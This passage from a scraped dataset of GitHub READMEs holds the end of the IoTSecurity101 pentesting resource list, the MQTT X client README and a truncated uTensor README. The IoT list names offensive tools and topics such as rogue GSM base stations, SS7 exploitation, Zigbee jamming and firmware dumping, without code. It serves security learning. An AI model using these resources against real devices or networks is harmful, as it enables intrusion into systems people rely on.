Checking Guides\nReflecting upon OWASP TOP-10 IoT Vulnerabilities\nOWASP IoT Top 10 2018 Mapping Project\nHardware toolkits for IoT security analysis\nIoT Gateway Software\nWebthings by Mozilla - RaspberryPi\nIoT Pentesting OSes\nSigint OS- LTE IMSI Catcher\nInstatn-gnuradio OS - For Radio Signals Testing\nAttifyOS - IoT Pentest OS - by Aditya Gupta\nUbutnu Best Host Linux for IoT's - Use LTS\nInternet of Things - Penetration Testing OS\nDragon OS - DEBIAN LINUX WITH PREINSTALLED OPEN SOURCE SDR SOFTWARE\nEmbedOS - Embedded security testing virtual machine\nSkywave Linux- Software Defined Radio for Global Online Listening\nA Small, Scalable Open Source RTOS for IoT Embedded Devices\nICS - Controlthings.io\nExploitation Tools\nExpliot - IoT Exploitation framework - by Aseemjakhar\nRoutersploit (Exploitation Framework for Embedded Devices)\nIoTSecFuzz (comprehensive testing for IoT device)\nHomePwn - Swiss Army Knife for Pentesting of IoT Devices\nkillerbee - Zigbee exploitation\nPRET - Printer Exploitation Toolkit\nHAL \u2013 The Hardware Analyzer\nFwAnalyzer (Firmware Analyzer)\nISF(Industrial Security Exploitation Framework\nPENIOT: Penetration Testing Tool for IoT\nMQTT-PWN\nReverse Engineering Tools\nIDA Pro\nGDB\nRadare2 | cutter\nGhidra\nIntroduction\nIntroduction to IoT\nIoT Architecture\nIoT attack surface\nIoT Protocols Overview\nIoT Web and message services\nMQTT\nIntroduction\nHacking the IoT with MQTT\nthoughts about using IoT MQTT for V2V and Connected Car from CES 2014\nNmap\nThe Seven Best MQTT Client Tools\nA Guide to MQTT by Hacking a Doorbell to send Push Notifications\nAre smart homes vulnerable to hacking\nDeep Learning UDF for KSQL / ksqlDB for Streaming Anomaly Detection of MQTT IoT Sensor Data\nAuthenticating & Authorizing Devices using MQTT with Auth0\nDevelopment information for the MQTT with hardware\nUnderstanding the MQTT Protocol Packet Structure\nR7-2019-18: Multiple Hickory Smart Lock Vulnerabilities\nIoT Live Demo: 100.000 Connected Cars With Kubernetes, Kafka, MQTT, TensorFlow\nSoftwares\nMosquitto-An open source MQTT broker\nHiveMQ\nMQTT Explorer\nMQTT proxy - IoXY\nMQTT Broker Security - 101\nWelcome to MQTT-PWN!\nCoAP\nIntroduction\nCoAP client Tools\nCoAP Pentest Tools\nNmap - NSE for coap\nRADIO HACKER QUICK START GUIDE\nSDR Notes - Radio IoT Protocols Overview\nUnderstanding Radio\nIntroduction to Software Defined Radio\nIntroduction Gnuradio companion\nCreating a flow graph in gunradiocompanion\nAnalysing radio signals 433Mhz\nRecording specific radio signal\nReplay Attacks with raspberrypi -rpitx\nCellular Hacking GSM BTS\nBTS\nAwesome-Cellular-Hacking\nwhat is base tranceiver station\nHow to Build Your Own Rogue GSM BTS\nGSM SS7 Pentesting\nIntroduction to GSM Security\nGSM Security 2\nvulnerabilities in GSM security with USRP B200\nSecurity Testing 4G (LTE) Networks\nCase Study of SS7/SIGTRAN Assessment\nTelecom Signaling Exploitation Framework - SS7, GTP, Diameter & SIP\nss7MAPer \u2013 A SS7 pen testing toolkit\nIntroduction to SIGTRAN and SIGTRAN Licensing\nSS7 Network Architecture\nIntroduction to SS7 Signaling\nBreaking LTE on Layer Two\nZigbee ALL Stuff\nIntroduction and protocol Overview\nHacking Zigbee Devices with Attify Zigbee Framework\nHands-on with RZUSBstick\nZigBee & Z-Wave Security Brief\nHacking ZigBee Networks\nZigator: Analyzing the Security of Zigbee-Enabled Smart Homes\nSecurity Analysis of Zigbee Networks with Zigator and GNU Radio\nLow-Cost ZigBee Selective Jamming\nSW TOOLS\nzigbear\nZigDiggity\nZigator\nZ3sec\nHardware Tools for Zigbee\nAPIMOTE IEEE 802.15.4/ZIGBEE SNIFFING HARDWARE\nRaspBee-The Raspberry Pi Zigbee gateway\nUSRP SDR 2\nATUSB IEEE 802.15.4 USB Adapter\nnRF52840-Dongle\nBLE Intro and SW-HW Tools to pentest\nStep By Step guide to BLE Understanding and Exploiting\nTraffic Engineering in a Bluetooth Piconet\nBLE Characteristics\nBluetooth and BLE Pentest Tools\nbtproxy\nhcitool & bluez\nTesting With GATT Tool\nCracking encryption\nbettercap\nBtleJuice Bluetooth Smart Man-in-the-Middle framework\ngattacker\nBTLEjack Bluetooth Low Energy Swiss army knife\nHardware for bluetooth hacking\nNRFCONNECT - 52840\nEDIMAX\nCSR 4.0\nESP32 - Development and learning Bluetooth\nUbertooth\nSena 100\nBLE Pentesting Tutorials\nBluetooth vs BLE Basics\nFinding bugs in Bluetooth\nIntel Edison as Bluetooth LE \u2014 Exploit box\nHow I Reverse Engineered and Exploited a Smart Massager\nMy journey towards Reverse Engineering a Smart Band \u2014 Bluetooth-LE RE\nBluetooth Smartlocks\nI hacked MiBand 3\nGATTacking Bluetooth Smart Devices\nblueooth beacon vulnerability\nSweyntooth Vulnerabilties\nAIRDROP_LEAK - sniffs BLE traffic and displays status messages from Apple devices\nMobile security (Android & iOS)\nAndroid App Reverse Engineering 101\nAndroid Application pentesting book\nAndroid Pentest Video Course-TutorialsPoint\nIOS Pentesting\nOWASP Mobile Security Testing Guide\nAndroid Tamer - Android Tamer is a Virtual / Live Platform for Android Security professionals\nOnline Assemblers\nAZM Online Arm Assembler by Azeria\nOnline Disassembler\nCompiler Explorer is an interactive online compiler which shows the assembly output of compiled C++, Rust, Go\nARM\nAzeria Labs\nARM EXPLOITATION FOR IoT\nDamn Vulnerable ARM Router (DVAR)\nEXPLOIT.EDUCATION\nPentesting Firmwares and emulating and analyzing\nEMBA-An analyzer for embedded Linux firmware\nFirmware analysis and reversing\nIoT Security Verification Standard (ISVS)\nOWASP Firmware Security Testing Methodology\nFirmware emulation with QEMU\nReversing ESP8266 Firmware\nEmulating Embedded Linux Devices with QEMU\nEmulating Embedded Linux Systems with QEMU\nFuzzing Embedded Linux Devices\nEmulating ARM Router Firmware\nReversing Firmware With Radare\nSamsung Firmware Magic - Unpacking and Decrypting\nQiling & Binary Emulation for automatic unpacking\nReverse engineering with #Ghidra: Breaking an embedded firmware encryption scheme\nSimulating and hunting firmware vulnerabilities with Qiling\nFirmware samples to pentest\nDownload From here by firmware.center\nBootloader\nDev\nWriting a Bootloader\nStorage Medium\nHARDWARE HACKING 101: IDENTIFYING AND DUMPING EMMC FLASH\nEMMC DATA RECOVERY FROM DAMAGED SMARTPHONE\nAnother bunch of Atricles for EMMC\nUnleash your smart-home devices: Vacuum Cleaning Robot Hacking\nIoT hardware Overview and Hacking\nIoT Hardware Guide\nIntro To Hardware Hacking - Dumping Your First Firmware\nHardware Gadgets to pentest\nBus Pirate\nEEPROM reader/SOIC Cable\nJtagulator/Jtagenum\nLogic Analyzer\nThe Shikra\nFaceDancer21 (USB Emulator/USB Fuzzer)\nRfCat\nHak5Gear- Hak5FieldKits\nUltra-Mini Bluetooth CSR 4.0 USB Dongle Adapter\nAttify Badge - UART, JTAG, SPI, I2C (w/ headers)\nAttacking Hardware Interfaces\nAn Introduction to Hardware Hacking\nSerial Terminal Basics\nReverse Engineering Serial Ports\nREVERSE ENGINEERING ARCHITECTURE AND PINOUT OF CUSTOM ASICS\nChipWhisperer - Hardware attacks\nHardware hacking tutorial: Dumping and reversing firmware\nSPI\nReading FlashROMS\nDumping the firmware From Router using BUSPIRATE - SPI Dump\nHow to Flash Chip of a Router With a Programmer | TP-Link Router Repair & MAC address change\nExtracting Flash Memory over SPI\nUART\nIdentifying UART interface\nonewire-over-uart\nAccessing sensor via UART\nUsing UART to connect to a chinese IP cam\nA journey into IoT \u2013 Hardware hacking: UART\nUARTBruteForcer\nUART Connections and Dynamic analysis on Linksys e1000\nAccessing and Dumping Firmware Through UART\nJTAG\nJTAG Explained (finally!)\nBuspirate JTAG Connections - Openocd\nSideChannel Attacks and Glitching attacks\nSide channel attacks\nAttacks on Implementations of Secure Systems\nfuzzing, binary analysis, IoT security, and general exploitation\nNAND Glitching Attack\nVoltage Glitching Attack\nEspressif ESP32: Bypassing Encrypted Secure Boot(CVE-2020-13629)\nVoltage Glitching Attack using SySS iCEstick Glitcher\nSamy Kamkar - FPGA Glitching & Side Channel Attacks\nHardware Power Glitch Attack (Fault Injection) - rhme2 Fiesta (FI 100)\nBreaking AES with ChipWhisperer - Piece of scake (Side Channel Analysis 100)\nhttps://www.youtube.com/watch?v=4urMITJKQQs&ab_channel=stacksmashing\nAwesome IoT Pentesting Guides\nShodan Pentesting Guide\nCar Hacking Practical Guide 101\nOWASP Firmware Security Testing Methodology\nawesome-bluetooth-security\nFirmware Pentest Guide\nVulnerable IoT and Hardware Applications\nIoT Goat : https://github.com/scriptingxss/IoTGoat\nIoT : https://github.com/Vulcainreo/DVID\nSafe : https://insinuator.net/2016/01/damn-vulnerable-safe/\nRouter : https://github.com/praetorian-code/DVRF\nSCADA : https://www.slideshare.net/phdays/damn-vulnerable-chemical-process\nPI : https://whitedome.com.au/re4son/sticky-fingers-dv-pi/\nSS7 Network: https://www.blackhat.com/asia-17/arsenal.html#damn-vulnerable-ss7-network\nVoIP : https://www.vulnhub.com/entry/hacklab-vulnvoip,40/\nfollow the people\nJilles\nJoe Fitz\nAseem Jakhar\nCybergibbons\nJasper\nDave Jones\nbunnie\nIlya Shaposhnikov\nMark C.\nA-a-ron Guzman\nArun Mane\nYashin Mehaboobe\nArun Magesh", "link": "https://github.com/V33RU/IoTSecurity101", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "approach methodology\n1. network\n2. web (front & backend and web services)\n3. mobile app (android & ios)\n4. wireless connectivity (zigbee , wifi , bluetooth , etc)\n5. firmware pentesting (os of iot devices)\n6. hardware hacking & fault injections & sca attacks\n7. storage medium\n8. i/o ports\ncontents\niot security information\niot security chat groups\nbooks\nblogs\ncheatsheets\nsearch engines\nctf\nyoutube\nexploitation tools\niot pentesting oses\niot vulnerabilites checking guides\niot labs\nawesome iot pentesting guides\nnetwork\nweb iot message protocols\nmqtt\ncoap\nmobile app\nmobile security (android & ios)\nwireless protocols\nradio hacking starting guide\ncellular hacking gsm bts\nzigbee\nbluetooth\nfirmware\nreverse engineering tools\nonline assemblers\narm\npentesting firmwares and emulating and analyzing\nfirmware samples to pentest\nbootloader\nhardware\niot hardware intro\n[iot hardware hacking intro]\nrequired hardware to pentest iot\nhardware interfaces\nspi\nuart\njtag\nsidechannel attacks & glitching attacks\nstorage medium\nto seen hacked devices\nhttps://blog.exploitee.rs/2018/10/\nhttps://www.exploitee.rs/\nhttps://forum.exploitee.rs/\nyour lenovo watch x is watching you & sharing what it learns\nyour smart scale is leaking more than your weight: privacy issues in iot\nsmart bulb offers light, color, music, and\u2026 data exfiltration?\nbesder-ipcamera analysis\nsmart lock\nsubaru head unit jailbreak\njeep hack\ndropcam hacking\nprinter hacking live sessions - gamozolabs\nchat groups for iot security\niotsecurity101 telegram - https://t.me/iotsecurity1011\niotsecurity101 reddit - https://www.reddit.com/r/iotsecurity101/\niotsecurity101 discord - https://discord.gg/eh9dxt9\nhardware hacking telegram - https://t.me/hardwarehackingbrasil\nnforceit telegram - https://t.me/joinchat/jamxog5yzdkgjcf3hmngqw\nrfid discord group - https://discord.gg/z43trcvypr\nics discord group - https://discord.com/invite/cmddsfk\nbooks for iot pentesting\nthe firmware handbook (embedded technology) 1st edition by jack ganssle - 2004\nhardware hacking: have fun while voiding your warranty 1st edition - 2004\nlinksys wrt54g ultimate hacking 1st edition by paul asadoorian - 2007\napplied cyber security and the smart grid: implementing security controls into the modern power infrastructure by eric d. knapp , raj samani -2013\nhacking the xbox-an introduction to reverse engineering hacking the xbox by andrew \u201cbunnie\u201d huang - openbook - 2013\nandroid hacker's handbook by joshua j. drake - 2014\nthe art of pcb reverse engineering: unravelling the beauty of the original design - 2015\nabusing the internet of things: blackouts, freakouts, and stakeouts 1st edition, by nitesh dhanjani - 2015\nlearning linux binary analysis by ryan \"elfmaster\" o'neill - 2016\ncar hacker's handbook by craig smith - 2016\niot penetration testing cookbook by aaron guzman , aditya gupta - 2017\ninside radio: an attack and defense guide by authors: yang, qing, huang, lin -2018\npentest hardware - openbook -2018\ngray hat hacking: the ethical hacker's handbook, fifth edition 5th edition by by daniel regalado , shon harris , allen harper , chris eagle , jonathan ness , branko spasojevic , ryan linn , stephen sims - 2018\nthe hardware hacking handbook: breaking embedded security with hardware attacks front cover jasper van woudenberg, colin o'flynn - 2021\npractical iot hacking-the definitive guide to attacking the internet of things by fotios chantzis, ioannis stais, paulino calderon, evangelos deirmentzoglou, beau woods - 2021\ninternet of things security encyclopedia - openbook\nblogs for iotpentest\nhttps://payatu.com/blog/\nhttps://raelize.com/blog/\nhttp://jcjc-dev.com/\nhttps://w00tsec.blogspot.in/\nhttp://www.devttys0.com/\nhttps://wrongbaud.github.io/\nhttps://embeddedbits.org/\nhttps://www.rtl-sdr.com/\nhttps://keenlab.tencent.com/en/\nhttps://courk.cc/\nhttps://iotsecuritywiki.com/\nhttps://cybergibbons.com/\nhttp://firmware.re/\nhttp://blog.k3170makan.com/\nhttps://blog.tclaverie.eu/\nhttp://blog.besimaltinok.com/category/iot-pentest/\nhttps://ctrlu.net/\nhttp://iotpentest.com/\nhttps://blog.attify.com\nhttps://duo.com/decipher/\nhttp://www.sp3ctr3.me\nhttp://blog.0x42424242.in/\nhttps://dantheiotman.com/\nhttps://blog.danman.eu/\nhttps://quentinkaiser.be/\nhttps://blog.quarkslab.com\nhttps://blog.ice9.us/\nhttps://labs.f-secure.com/\nhttps://mg.lol/blog/\nhttps://cjhackerz.net/\nhttps://github.com/sponsors/bunnie/\nhttps://iotmyway.wordpress.com/\nhttps://www.synacktiv.com/publications.html\nhttp://blog.cr4.sh/\nhttps://ktln2.org/\nhttps://naehrdine.blogspot.com/\nawesome cheatsheets\nhardware hacking\nnmap\nsearch engines for iot openly devices\nshodan\nfofa\ncensys\nzoomeye\nonyphe\nctf for iot and embeddded\nhttps://github.com/hackgnar/ble_ctf\nhttps://www.microcorruption.com/\nhttps://github.com/riscure/rhme-2016\nhttps://github.com/riscure/rhme-2017\nhttps://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html\nhttps://github.com/scriptingxss/iotgoat\nyoutube channels for iot pentesting\nliveoverflow\nbinary adventure\neevblog\njackktutorials\ncraig smith\niotpentest [mr-iot]\nbesim altinok - iot - hardware - wireless\nghidra ninja\ncyber gibbons\nscanline\naaron christophel\nvehicle security resources\nhttps://github.com/jaredthecoder/awesome-vehicle-security\niot vulnerabilites checking guides\nreflecting upon owasp top-10 iot vulnerabilities\nowasp iot top 10 2018 mapping project\nhardware toolkits for iot security analysis\niot gateway software\nwebthings by mozilla - raspberrypi\niot pentesting oses\nsigint os- lte imsi catcher\ninstatn-gnuradio os - for radio signals testing\nattifyos - iot pentest os - by aditya gupta\nubutnu best host linux for iot's - use lts\ninternet of things - penetration testing os\ndragon os - debian linux with preinstalled open source sdr software\nembedos - embedded security testing virtual machine\nskywave linux- software defined radio for global online listening\na small, scalable open source rtos for iot embedded devices\nics - controlthings.io\nexploitation tools\nexpliot - iot exploitation framework - by aseemjakhar\nroutersploit (exploitation framework for embedded devices)\niotsecfuzz (comprehensive testing for iot device)\nhomepwn - swiss army knife for pentesting of iot devices\nkillerbee - zigbee exploitation\npret - printer exploitation toolkit\nhal \u2013 the hardware analyzer\nfwanalyzer (firmware analyzer)\nisf(industrial security exploitation framework\npeniot: penetration testing -----> tool !!!  for iot\nmqtt-pwn\nreverse engineering tools\nida pro\ngdb\nradare2 | cutter\nghidra\nintroduction\nintroduction to iot\niot architecture\niot attack surface\niot protocols overview\niot web and message services\nmqtt\nintroduction\nhacking the iot with mqtt\nthoughts about using iot mqtt for v2v and connected car from ces 2014\nnmap\nthe seven best mqtt client tools\na guide to mqtt by hacking a doorbell to send push notifications\nare smart homes vulnerable to hacking\ndeep learning udf for ksql / ksqldb for streaming anomaly detection of mqtt iot sensor data\nauthenticating & authorizing devices using mqtt with auth0\ndevelopment information for the mqtt with hardware\nunderstanding the mqtt protocol packet structure\nr7-2019-18: multiple hickory smart lock vulnerabilities\niot live demo: 100.000 connected cars with kubernetes, kafka, mqtt, tensorflow\nsoftwares\nmosquitto-an open source mqtt broker\nhivemq\nmqtt explorer\nmqtt proxy - ioxy\nmqtt broker security - 101\nwelcome to mqtt-pwn!\ncoap\nintroduction\ncoap client tools\ncoap pentest tools\nnmap - nse for coap\nradio hacker quick start guide\nsdr notes - radio iot protocols overview\nunderstanding radio\nintroduction to software defined radio\nintroduction gnuradio companion\ncreating a flow graph in gunradiocompanion\nanalysing radio signals 433mhz\nrecording specific radio signal\nreplay attacks with raspberrypi -rpitx\ncellular hacking gsm bts\nbts\nawesome-cellular-hacking\nwhat is base tranceiver station\nhow to build your own rogue gsm bts\ngsm ss7 pentesting\nintroduction to gsm security\ngsm security 2\nvulnerabilities in gsm security with usrp b200\nsecurity testing 4g (lte) networks\ncase study of ss7/sigtran assessment\ntelecom signaling exploitation framework - ss7, gtp, diameter & sip\nss7maper \u2013 a ss7 pen testing toolkit\nintroduction to sigtran and sigtran licensing\nss7 network architecture\nintroduction to ss7 signaling\nbreaking lte on layer two\nzigbee all stuff\nintroduction and protocol overview\nhacking zigbee devices with attify zigbee framework\nhands-on with rzusbstick\nzigbee & z-wave security brief\nhacking zigbee networks\nzigator: analyzing the security of zigbee-enabled smart homes\nsecurity analysis of zigbee networks with zigator and gnu radio\nlow-cost zigbee selective jamming\nsw tools\nzigbear\nzigdiggity\nzigator\nz3sec\nhardware tools for zigbee\napimote ieee 802.15.4/zigbee sniffing hardware\nraspbee-the raspberry pi zigbee gateway\nusrp sdr 2\natusb ieee 802.15.4 usb adapter\nnrf52840-dongle\nble intro and sw-hw tools to pentest\nstep by step guide to ble understanding and exploiting\ntraffic engineering in a bluetooth piconet\nble characteristics\nbluetooth and ble pentest tools\nbtproxy\nhcitool & bluez\ntesting with gatt tool\ncracking encryption\nbettercap\nbtlejuice bluetooth smart man-in-the-middle framework\ngattacker\nbtlejack bluetooth low energy swiss army knife\nhardware for bluetooth hacking\nnrfconnect - 52840\nedimax\ncsr 4.0\nesp32 - development and learning bluetooth\nubertooth\nsena 100\nble pentesting tutorials\nbluetooth vs ble basics\nfinding bugs in bluetooth\nintel edison as bluetooth le \u2014 exploit box\nhow i reverse engineered and exploited a smart massager\nmy journey towards reverse engineering a smart band \u2014 bluetooth-le re\nbluetooth smartlocks\ni hacked miband 3\ngattacking bluetooth smart devices\nblueooth beacon vulnerability\nsweyntooth vulnerabilties\nairdrop_leak - sniffs ble traffic and displays status messages from apple devices\nmobile security (android & ios)\nandroid app reverse engineering 101\nandroid application pentesting book\nandroid pentest video course-tutorialspoint\nios pentesting\nowasp mobile security testing guide\nandroid tamer - android tamer is a virtual / live platform for android security professionals\nonline assemblers\nazm online arm assembler by azeria\nonline disassembler\ncompiler explorer is an interactive online compiler which shows the assembly output of compiled c++, rust, go\narm\nazeria labs\narm exploitation for iot\ndamn vulnerable arm router (dvar)\nexploit.education\npentesting firmwares and emulating and analyzing\nemba-an analyzer for embedded linux firmware\nfirmware analysis and reversing\niot security verification standard (isvs)\nowasp firmware security testing methodology\nfirmware emulation with qemu\nreversing esp8266 firmware\nemulating embedded linux devices with qemu\nemulating embedded linux systems with qemu\nfuzzing embedded linux devices\nemulating arm router firmware\nreversing firmware with radare\nsamsung firmware magic - unpacking and decrypting\nqiling & binary emulation for automatic unpacking\nreverse engineering with #ghidra: breaking an embedded firmware encryption scheme\nsimulating and hunting firmware vulnerabilities with qiling\nfirmware samples to pentest\ndownload from here by firmware.center\nbootloader\ndev\nwriting a bootloader\nstorage medium\nhardware hacking 101: identifying and dumping emmc flash\nemmc data recovery from damaged smartphone\nanother bunch of atricles for emmc\nunleash your smart-home devices: vacuum cleaning robot hacking\niot hardware overview and hacking\niot hardware guide\nintro to hardware hacking - dumping your first firmware\nhardware gadgets to pentest\nbus pirate\neeprom reader/soic cable\njtagulator/jtagenum\nlogic analyzer\nthe shikra\nfacedancer21 (usb emulator/usb fuzzer)\nrfcat\nhak5gear- hak5fieldkits\nultra-mini bluetooth csr 4.0 usb dongle adapter\nattify badge - uart, jtag, spi, i2c (w/ headers)\nattacking hardware interfaces\nan introduction to hardware hacking\nserial terminal basics\nreverse engineering serial ports\nreverse engineering architecture and pinout of custom asics\nchipwhisperer - hardware attacks\nhardware hacking tutorial: dumping and reversing firmware\nspi\nreading flashroms\ndumping the firmware from router using buspirate - spi dump\nhow to flash chip of a router with a programmer | tp-link router repair & mac address change\nextracting flash memory over spi\nuart\nidentifying uart interface\nonewire-over-uart\naccessing sensor via uart\nusing uart to connect to a chinese ip cam\na journey into iot \u2013 hardware hacking: uart\nuartbruteforcer\nuart connections and dynamic analysis on linksys e1000\naccessing and dumping firmware through uart\njtag\njtag explained (finally!)\nbuspirate jtag connections - openocd\nsidechannel attacks and glitching attacks\nside channel attacks\nattacks on implementations of secure systems\nfuzzing, binary analysis, iot security, and general exploitation\nnand glitching attack\nvoltage glitching attack\nespressif esp32: bypassing encrypted secure boot(cve-2020-13629)\nvoltage glitching attack using syss icestick glitcher\nsamy kamkar - fpga glitching & side channel attacks\nhardware power glitch attack (fault injection) - rhme2 fiesta (fi 100)\nbreaking aes with chipwhisperer - piece of scake (side channel analysis 100)\nhttps://www.youtube.com/watch?v=4urmitjkqqs&ab_channel=stacksmashing\nawesome iot pentesting guides\nshodan pentesting guide\ncar hacking practical guide 101\nowasp firmware security testing methodology\nawesome-bluetooth-security\nfirmware pentest guide\nvulnerable iot and hardware applications\niot goat : https://github.com/scriptingxss/iotgoat\niot : https://github.com/vulcainreo/dvid\nsafe : https://insinuator.net/2016/01/damn-vulnerable-safe/\nrouter : https://github.com/praetorian-code/dvrf\nscada : https://www.slideshare.net/phdays/damn-vulnerable-chemical-process\npi : https://whitedome.com.au/re4son/sticky-fingers-dv-pi/\nss7 network: https://www.blackhat.com/asia-17/arsenal.html#damn-vulnerable-ss7-network\nvoip : https://www.vulnhub.com/entry/hacklab-vulnvoip,40/\nfollow the people\njilles\njoe fitz\naseem jakhar\ncybergibbons\njasper\ndave jones\nbunnie\nilya shaposhnikov\nmark c.\na-a-ron guzman\narun mane\nyashin mehaboobe\narun magesh", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000084, "year": null}, {"Unnamed: 0": 85, "autor": 85, "date": null, "content": "English | \u7b80\u4f53\u4e2d\u6587 | \u65e5\u672c\u8a9e\nMQTT X is a cross-platform MQTT 5.0 client tool open sourced by EMQ, which can run on macOS, Linux and Windows, and supports formatting MQTT payload.\nMQTT X simplifies the operation logic of the page with the help of chatting software. The user can quickly create a connection to save and establish multiple connection clients at the same time. It is convenient for the user to quickly test the connection of MQTT/TCP\u3001MQTT/TLS, MQTT/WebSocket Publish / Subscribe functions and other features.\nMQTT stands for MQ Telemetry Transport. It is a publish/subscribe, extremely simple and lightweight messaging protocol, designed for constrained devices and low-bandwidth, high-latency or unreliable networks.\nPreview\nInstallation\nCurrently available for download from these app stores\nMacOS App Store\nHomebrew\nThe MacOS users can install MQTT X using brew cask\nbrew install --cask mqttx\nLinux\nReleased Packages\nDownload from GitHub Releases and install it.\nAlternative, you can download here.\nUsage\nSee our blog or manual for details.\nMQTT Broker preparation.\nIf you do not need the MQTT Broker deployed locally, you can use the online public version of EMQ X for quick test;\nBroker IP: broker.emqx.io\nBroker TCP Port: 1883\nBroker SSL Port: 8883\nIf you plan to deploy a MQTT Broker running locally, we recommend you to download EMQ X for installation. EMQ X broker is a fully open source, highly scalable, highly available distributed MQTT messaging broker for IoT, M2M and Mobile applications that can handle tens of millions of concurrent clients.\nConnection configuration. Click the + button in the left menu bar and fill in the corresponding required fields in the form.\nAfter the connection information is configured, click the Connect button in the upper right corner to create a connection and connect to MQTT Broker.\nAfter the MQTT is connected successfully, you can perform MQTT publish and subscription tests.\nCommunity\nThe MQTT X community can be found on GitHub Discussions, where you can ask questions, voice ideas, and share your projects.\nTo chat with other community members you can join the EMQ X Slack.\nDevelop\nRecommended version for Node environment:\nv14.*.*\n# Clone\ngit clone git@github.com:emqx/MQTTX.git\n# Install dependencies\ncd MQTTX\nyarn install\n# Compiles and hot-reloads for development\nyarn run electron:serve\n# Compiles and minifies for production\nyarn run electron:build\nAfter the building is successful, the corresponding installation file for the successful build ing will appear in the dist_electron directory.\nIf you need to package it as an installation package for an independent operating system, please refer to the following command:\n# For Windows\nyarn run electron:build-win\n# For Linux\nyarn run electron:build-linux\n# For MacOS\nyarn run electron:build-mac\nContributing\nPlease make sure to read the Contributing Guide before making a pull request.\nTechnology Stack\nElectron\nVue + Element\nTypeScript\nTypeORM\nSQLite\nLicense\nApache License 2.0, see LICENSE.", "link": "https://github.com/emqx/MQTTX", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "english | \u7b80\u4f53\u4e2d\u6587 | \u65e5\u672c\u8a9e\nmqtt x is a cross-platform mqtt 5.0 client -----> tool !!!  open sourced by emq, which can run on macos, linux and windows, and supports formatting mqtt payload.\nmqtt x simplifies the operation logic of the page with the help of chatting software. the user can quickly create a connection to save and establish multiple connection clients at the same time. it is convenient for the user to quickly test the connection of mqtt/tcp\u3001mqtt/tls, mqtt/websocket publish / subscribe functions and other features.\nmqtt stands for mq telemetry transport. it is a publish/subscribe, extremely simple and lightweight messaging protocol, designed for constrained devices and low-bandwidth, high-latency or unreliable networks.\npreview\ninstallation\ncurrently available for download from these app stores\nmacos app store\nhomebrew\nthe macos users can install mqtt x using brew cask\nbrew install --cask mqttx\nlinux\nreleased packages\ndownload from github releases and install it.\nalternative, you can download here.\nusage\nsee our blog or manual for details.\nmqtt broker preparation.\nif you do not need the mqtt broker deployed locally, you can use the online public version of emq x for quick test;\nbroker ip: broker.emqx.io\nbroker tcp port: 1883\nbroker ssl port: 8883\nif you plan to deploy a mqtt broker running locally, we recommend you to download emq x for installation. emq x broker is a fully open source, highly scalable, highly available distributed mqtt messaging broker for iot, m2m and mobile applications that can handle tens of millions of concurrent clients.\nconnection configuration. click the + button in the left menu bar and fill in the corresponding required fields in the form.\nafter the connection information is configured, click the connect button in the upper right corner to create a connection and connect to mqtt broker.\nafter the mqtt is connected successfully, you can perform mqtt publish and subscription tests.\ncommunity\nthe mqtt x community can be found on github discussions, where you can ask questions, voice ideas, and share your projects.\nto chat with other community members you can join the emq x slack.\ndevelop\nrecommended version for node environment:\nv14.*.*\n# clone\ngit clone git@github.com:emqx/mqttx.git\n# install dependencies\ncd mqttx\nyarn install\n# compiles and hot-reloads for development\nyarn run electron:serve\n# compiles and minifies for production\nyarn run electron:build\nafter the building is successful, the corresponding installation file for the successful build ing will appear in the dist_electron directory.\nif you need to package it as an installation package for an independent operating system, please refer to the following command:\n# for windows\nyarn run electron:build-win\n# for linux\nyarn run electron:build-linux\n# for macos\nyarn run electron:build-mac\ncontributing\nplease make sure to read the contributing guide before making a pull request.\ntechnology stack\nelectron\nvue + element\ntypescript\ntypeorm\nsqlite\nlicense\napache license 2.0, see license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000085, "year": null}, {"Unnamed: 0": 88, "autor": 88, "date": null, "content": "uTensor - Test Release\nNote: If you are looking for stable releases, checkout master.\nTutorials\nBuilding Tutorial Examples\nMake sure cmake is available on your system and run following commands:\n$ mkdir build\n$ cd build\n$ cmake -DPACKAGE_TUTORIALS=ON ..\n$ make\nAfter the building process finish, you should find the tutorial executables under build/tutorials/ directory.\nFollow instructions in the README.md in each tutorial directories to learn how to use uTensor.\nHere are the links to the tutorials:\nError Handling with uTensor\nCustom Operator\nIntroduction\nWhat is it?\nuTensor is an extremely light-weight machine learning inference framework built on Tensorflow and optimized for Arm targets. It consists of a runtime library and an offline tool that handles most of the model translation work. This repo holds the core runtime and some example implementations of operators, memory managers/schedulers, and more, and the size of the core runtime is only ~2KB!\nModule .text .data .bss\nuTensor/src/uTensor/core 1275(+1275) 4(+4) 28(+28)\nuTensor/src/uTensor/tensors 791(+791) 0(+0) 0(+0)\nHow does the uTensor workflow work?\nA model is constructed and trained in Tensorflow. uTensor takes the model and produces a .cpp and .hpp file. These files contains the generated C++11 code needed for inferencing. Working with uTensor on the embedded side is as easy as copy-and-paste.\nHow does the uTensor runtime work?\nCheck out the detailed description here\nRelease Note\nThe rearchitecture is fundamentally centered around a few key ideas, and the structure of the code base and build tools naturally followed. Old key points:\nTensors describe how data is accessed and where from\nPerformance of ops depends on which tensors are used\nOperators are Tensor agnostic\nHigh performance ops can fetch blocks of data at once\nStrive for low total power in execution\nLow static and dynamic footprint, be small\nLow cost per Tensor throughout the entire system, since most generated models have 100+ including intermediates, also impacts dynamic footprint\nLightweight class hierarchy\nDuh\nNew additional key ideas:\nSystem safety\nAll tensor metadata and actual data are owned in dedicated regions\nThis can either be user provided, or one we create\nWe can guarantee that runtime will use no more than N bytes of RAM at code gen time or at compile time!\nGenerally should not collide with userspace or system space memory, i.e. dont share heaps\nGenerally implications: a safe runtime means we can safely update models remotely\nAs many compile time errors as possible!\nMismatched inputs, outputs, or numbers\nwrong sizes used\nImpossible memory accesses\netc.\nClear, Concise, and Debuggable\nPrevious iteration of uTensor relied almost too heavily on codegen, making changes to a model for any reason was near impossible\nA developer should be able to make changes to the model without relying on code gen\nA developer should be able to look at a model file and immediately understand what the graph looks like, without a massive amound of jumping around\nDefault tensor interface should behave like a higher level language, but exploit the speed of C++\nGenerally: No more pointer bullshit! C is super error prone, fight me\nOnly specialized operators have access to raw data blocks, and these ops will be wicked fast\nExtensible, configurable, and optimize-outable error handling\nGDB debugging IS NOW TRIVIAL\nAs mentioned before, these key 